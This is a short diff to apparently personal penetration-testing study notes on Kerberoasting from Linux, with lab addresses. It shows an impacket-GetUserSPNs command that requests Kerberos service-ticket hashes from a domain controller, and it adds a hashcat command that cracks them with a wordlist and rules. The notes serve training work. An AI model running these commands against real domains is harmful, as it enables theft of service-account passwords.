@@ -20,3 +20,5 @@ Perform Kerberoasting from Linux. use impacket-GetUserSPNs with the IP of the do
 
 Using impacket-GetUserSPNs to perform Kerberoasting on Linux to obtain TGS-REP hash:
 kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/mute
+
+kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
